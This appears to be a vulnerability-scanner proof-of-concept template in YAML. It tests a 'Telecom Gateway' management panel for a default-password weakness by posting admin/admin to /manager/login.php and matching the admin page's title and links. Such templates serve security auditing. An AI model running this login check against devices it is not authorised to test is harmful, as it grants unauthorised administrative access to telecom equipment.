id: poc-yaml-telecom-gateway-default-password
info:
  name: Telecom Gateway 默认密码漏洞
  severity: medium
  tags:
  - 访问控制错误
  finger: Telecom Gateway
  reference: []
  description: null
variables: {}
transport: http
requests:
- method: GET
  path: /manager/index.php
  headers: {}
  data: null
  redirect: false
  raw: null
  timeout: null
  expression: status_code == 200
  output: []
- method: POST
  path: /manager/login.php
  headers: {}
  data: Name=admin&Pass=admin
  redirect: false
  raw: null
  timeout: null
  expression: status_code == 200 && contains(body, "<title>电信网关服务器管理后台</title>") &&
    contains(body, "index-shang.php") && contains(body, "di.php")
  output: []
